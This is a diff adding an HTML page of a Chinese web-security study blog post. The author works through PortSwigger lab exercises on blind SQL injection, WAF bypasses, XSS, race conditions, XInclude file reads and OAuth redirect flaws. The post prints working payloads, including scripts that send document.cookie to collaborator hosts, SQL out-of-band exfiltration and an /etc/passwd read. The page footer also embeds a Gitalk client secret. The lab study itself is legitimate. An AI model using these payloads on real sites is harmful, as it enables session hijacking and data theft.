@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>新技巧学习 |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-一点新技巧"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+  
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  新技巧学习
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/01/03/%E4%B8%80%E7%82%B9%E6%96%B0%E6%8A%80%E5%B7%A7/" class="article-date">
+  <time datetime="2024-01-03T04:22:22.000Z" itemprop="datePublished">2024-01-03</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">8 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>题外话：很久没更新了，其实也在思考，这条路究竟适不适合我，我也很羡慕那些大佬，src排名啊，cnvd证书个数啊，但是他们想必也付出了很多，无数个日日夜夜，我还是继续吧，走一步看一步了。</p>
+<h1 id="0x01-SQL盲注"><a href="#0x01-SQL盲注" class="headerlink" title="0x01 SQL盲注"></a>0x01 SQL盲注</h1><h3 id="1-带外交互-数据泄露"><a href="#1-带外交互-数据泄露" class="headerlink" title="1.带外交互+数据泄露"></a>1.带外交互+数据泄露</h3><p>带外测试，也就是盲操作，比如盲ssrf，盲xxe，盲xss，这种就是目标机不显示任何回显信息，或者无法立即触发(比如xss)时利用。</p>
+<p>解决：外部服务器搭建，插入语句，让目标服务器访问我们的外部服务器，这里就是burp collaborator</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hi-blog/p/Burp-Collaborator-Usage.html">burp collaborator介绍、安装与使用</a></p>
+<p>就类似于dnslog了。</p>
+<p>这里是配合xxe去触发一个dns查询，证明存在这种漏洞。</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band">靶场1</a></p>
+<p><img src="/../../../Typora/img111/image-20240103133848176.png"></p>
+<p>证明有交互，那就可以尝试数据泄露</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration">靶场2</a></p>
+<p><img src="/../../../Typora/img111/image-20240103134334902.png" alt="注入语句"></p>
+<p><img src="/../../../Typora/img111/image-20240103143712237.png" alt="密码回显了"></p>
+<h3 id="2-xml编码绕过"><a href="#2-xml编码绕过" class="headerlink" title="2.xml编码绕过"></a>2.xml编码绕过</h3><p>因为该网站有一个库存检查的xml请求</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span>5<span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>2<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>1.尝试进行如下替换</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1+1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span>，也是可以的</span><br></pre></td></tr></table></figure>
+
+<p>2.判断sql注入</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//检测到攻击</span><br><span class="line"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1&#x27;<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1 UNION SELECT NULL<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>3.编码<strong>dec_entities</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span></span><br><span class="line">&lt;@dec_entities&gt;1&#x27;&lt;@/dec_entities&gt;<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span><br><span class="line">正常回显,绕过了</span><br></pre></td></tr></table></figure>
+
+<p>4.对**1’**进行关键字替换</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 order by 1 //回显有数字，其余的为0，则只有一列</span><br><span class="line">1 UNION SELECT username || &#x27;~&#x27; || password FROM users //回显了数据信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>burp collaborator在sql注入时，就和那个dnslog一样就可以了</p>
+<p>比如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>,database(),<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;abcdef...b.net\\a&#x27;</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-xss绕过"><a href="#0x02-xss绕过" class="headerlink" title="0x02 xss绕过"></a>0x02 xss绕过</h1><h3 id="1-尖括号编码bypass"><a href="#1-尖括号编码bypass" class="headerlink" title="1.尖括号编码bypass"></a>1.尖括号编码bypass</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//双引号闭合</span><br><span class="line">&quot; onmouseover=&quot;alert(1)</span><br><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-waf常见标签拦截"><a href="#2-waf常见标签拦截" class="headerlink" title="2.waf常见标签拦截"></a>2.waf常见标签拦截</h3><p>这里是<strong>仅仅用了waf</strong>，实际场景里是多方搭配的，waf+编码+替换等</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>0 search results for &#x27;&quot; onmouseover=&quot;alert(1)&#x27;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接给标题化了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//提示标签不允许</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>1.上intruder，用字典，期望找到一个不被禁用的<strong>标签</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.intruder，如此构造：</span><br><span class="line">GET /?search=&lt;§§&gt; HTTP/2</span><br><span class="line">2.上标签字典，爆破</span><br><span class="line">3.唯有一个正常200的：</span><br><span class="line">GET /?search=<span class="tag">&lt;<span class="name">body</span>&gt;</span> HTTP/2</span><br></pre></td></tr></table></figure>
+
+<p>2.找到标签后，继续爆破一个可触发的<strong>事件</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.构造如下：</span><br><span class="line">GET /?search=&lt;body+§§=1&gt; HTTP/2</span><br><span class="line">2.上事件字典爆破</span><br><span class="line">3.有几个200的：</span><br><span class="line">如onresize，onratechange，onbeforeinput...</span><br><span class="line">&lt;body+onresize=1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3.去恶意服务器尝试payload发送</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://0a6900ff0368276d80d108c700b9002e.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E&quot;</span> <span class="attr">onload</span>=<span class="string">this.style.width</span>=<span class="string">&#x27;100px&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">靶场位置</a></p>
+<h3 id="3-尖括号-x2F-双引号编码、单引号转义"><a href="#3-尖括号-x2F-双引号编码、单引号转义" class="headerlink" title="3.尖括号&#x2F;双引号编码、单引号转义"></a>3.尖括号&#x2F;双引号编码、单引号转义</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">h1</span>&gt;</span>0 search results for &#x27;<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(<span class="symbol">&amp;quot;</span>1<span class="symbol">&amp;quot;</span>)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&#x27;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">var searchTerms = &#x27;alert(\&#x27;1\&#x27;)&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>这个利用了反斜杠，构造payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">&#x27;-alert(1)//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;h1&gt;0 search results for &#x27;</span>\\&amp;apos;-<span class="title function_">alert</span>(<span class="number">1</span>)<span class="comment">//&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="keyword">var</span> searchTerms = <span class="string">&#x27;\\&#x27;</span>-<span class="title function_">alert</span>(<span class="number">1</span>)<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-xss获取cookie"><a href="#4-xss获取cookie" class="headerlink" title="4.xss获取cookie"></a>4.xss获取cookie</h3><p>这里的思路为：留言板留言-&gt;评论处构造恶意载荷(以burp collaborator获取访问者cookie)-&gt;burp collaborator得到交互信息-&gt;Poll now-&gt;获得http协议交互，可查看到受害者cookie(在请求包中)</p>
+<p>载荷内容</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;</span>, &#123;</span><br><span class="line"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line"><span class="attr">body</span>:<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>验证：去访问该留言板块时，确实出现弹窗</p>
+<h1 id="0x03-条件竞争"><a href="#0x03-条件竞争" class="headerlink" title="0x03 条件竞争"></a>0x03 条件竞争</h1><p>背景介绍：有一个优惠券码，仅限使用<strong>一次</strong>；但是通过测试发现，通过<strong>并发</strong>的手段可以实现优惠券的多次使用，而目标商品有1300，购买者只有50块。</p>
+<p>所以对使用优惠码的地方进行拦截，并发</p>
+<p>当请求次数为30次时，明显目标商品有优惠后，有500多了，但还是买不起，所以将相应次数调整后再看</p>
+<p>我试了几个没成功，虽然都多次降价了，还是买不起，知道思路方法就好。</p>
+<p>工具介绍：Turbo intruder</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun">靶场位置</a></p>
+<p>PS：对于并发，burp中有自带的一个技巧，就是将repeater中的某个请求包先ctrl+r(重复发送到repeater)到20次，再将它们添加成一个**<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/repeater/groups">组</a><strong>，再</strong>并发即可<strong>，但是至少要</strong>2023.9<strong>版本才有</strong>Sending requests in parallel**选项</p>
+<h1 id="0x04-xml攻击"><a href="#0x04-xml攻击" class="headerlink" title="0x04 xml攻击"></a>0x04 xml攻击</h1><p>emmm，这个我之前学过理论，但没多久就忘了。</p>
+<p>直接看<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning">靶场</a>吧</p>
+<p><strong>背景</strong></p>
+<p>就是说，post请求体中有一个productid&#x3D;1&amp;storeId&#x3D;1，除了测试sql注入，还可以进行<a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/xxe.html">xml注入</a>，包括但不限于任意文件读取、rce、XInclude等</p>
+<p>这里的payload是XInclude</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">productid=<span class="tag">&lt;<span class="name">dag</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">dag</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20240104123126253.png" alt="读取/etc/passwd"></p>
+<p>它这里是配合工具来的，就是说一开始就扫描，很慢；那需要人工去筛选一个可疑的地方<strong>再</strong>进行针对扫描，就很快</p>
+<p>其它参考：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing">burp自带的扫描也很重要</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/syroot/p/15914826.html">三亿人</a></p>
+</blockquote>
+<h1 id="0x05-burp的扫描功能"><a href="#0x05-burp的扫描功能" class="headerlink" title="0x05 burp的扫描功能"></a>0x05 burp的扫描功能</h1><p>这是一个针对性的非标准性、局部扫描，<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing">详见此处</a></p>
+<p>解释：可能遇见一种参数为，<code>user=048857-carlos</code>，后端可能处理这两部分作为输入，<strong>048857和carlos</strong>，如果是传统的扫描这部分的话，可能就是对048857-carlos后面加些东西，但如果只想对048857单独扫描的话，就需要用到<strong>Scan selected insertion point</strong></p>
+<p>第一遍没扫到，等个几分钟，有一个存储xss漏洞，构造如下载荷，发送到burp Collaborator，有回显信息后并poll know</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&quot;&gt;&lt;svg/onload=fetch(`//a7ik8h9k145mbu67363joskez55wtmhb.oastify.com/$&#123;encodeURIComponent(document.cookie)&#125;`)&gt;:YTowF2SzCdbOWIQpsZr1hC3YYOl3OkQQ</span></span><br><span class="line"><span class="string">#获取解码后的cookie信息，冒号后面是自己的session</span></span><br></pre></td></tr></table></figure>
+
+<p>查看http的请求得到<strong>管理员cookie信息</strong>，直接替换后，可以进入管理面板，删除目标用户信息</p>
+<h1 id="0x06-Oauth服务"><a href="#0x06-Oauth服务" class="headerlink" title="0x06 Oauth服务"></a>0x06 Oauth服务</h1><p>背景：OAuth服务框架呢，允许使用社交媒体账号登录；我自己整理一下它的工作流程：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/oauth">完整版在这里</a></p>
+<p>1.<strong>应用程序</strong>要去请求<strong>资源所有者</strong>的某个数据的<code>访问权限</code></p>
+<p>2.<strong>资源所有者</strong>登录到OAuth，就表示同意了</p>
+<p>3.<strong>应用程序</strong>获取到一个<code>令牌</code>(这个令牌代替了传统的密码)，可以让它调用接口访问相应数据</p>
+<p>OAuth服务标识：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /authorization?client_id=12345&amp;redirect_uri=https://client-app.com/callback&amp;response_type=token&amp;scope=openid%20profile&amp;state=ae13d489bd00e3c24</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-只校验了邮箱"><a href="#1-只校验了邮箱" class="headerlink" title="1.只校验了邮箱"></a>1.只校验了邮箱</h3><p>已有可登录的post请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;email&quot;:&quot;winener@qq.com&quot;,&quot;username&quot;:&quot;wiener&quot;,&quot;token&quot;:&quot;oKQJxlA0V7WZp4Wgkf460k51sLMs0XcEfapPKw6xK4-&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将email替换成carlos的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">carlos@carlos-montoya.net</span><br></pre></td></tr></table></figure>
+
+<p>发送该请求包后，burp-&gt;Request in browser &gt; In original session，复制url即可登录到carlos的</p>
+<h3 id="2-redirect-url"><a href="#2-redirect-url" class="headerlink" title="2.redirect_url"></a>2.redirect_url</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect">靶场位置</a></p>
+<p>目的：获得管理员的API</p>
+<p>1.用已知用户wiener登录，发现API是隐藏的，且登录成功时会<strong>回退</strong>到博客首页，从http history不难看出，中间的步骤是有redirect_uri的</p>
+<p>2.尝试注销用户，从登录的那一刻开始就拦截，直到forward到有参数为redirect_uri的数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /auth?client_id=hi4agpm9ff62hzt7plwob&amp;redirect_uri=https://0a21001403bb9f1780249e7200de00e1.web-security-academy.net/oauth-callback&amp;response_type=token&amp;nonce=484576008&amp;scope=openid%20profile%20email</span><br></pre></td></tr></table></figure>
+
+<p>3.尝试目录遍历</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为uri添加/../post?postId=1</span><br></pre></td></tr></table></figure>
+
+<p>4.继续forward后，登录成功，且页面跳转到<strong>第一个博客的位置</strong>，且url泄露出有access_token</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a21001403bb9f1780249e7200de00e1.web-security-academy.net/oauth-callback/../post?postId=1#access_token=Y9VTceiQraY9-hTxs0jixVVwDo1eaycirL0EokzJn7h&amp;amp;expires_in=3600&amp;amp;token_type=Bearer&amp;amp;scope=openid%20profile%20email&quot;</span><br></pre></td></tr></table></figure>
+
+<p>5.而且根据burp呢，发现有一个接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /post/next?path=/post?postId=2 HTTP/2</span><br><span class="line">其作用不言而喻</span><br></pre></td></tr></table></figure>
+
+<p><strong>危害就出现了</strong>，那攻击者完全可以构造恶意url地址</p>
+<p>后面有点麻烦，去吃饭了，以后再说</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/01/03/%E4%B8%80%E7%82%B9%E6%96%B0%E6%8A%80%E5%B7%A7/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/burpcollaborator/" rel="tag">burpcollaborator</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/csrf/" rel="tag">csrf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2023/12/01/web-cache/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">web_cache</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk',
+    owner: 'ak005469075',
+    admin: ['ak005469075'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023-2024
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+  <script type="text/javascript">
+$(function () {
+    console.log("lets go！");
+    console.log("/");
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+</div>
+
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
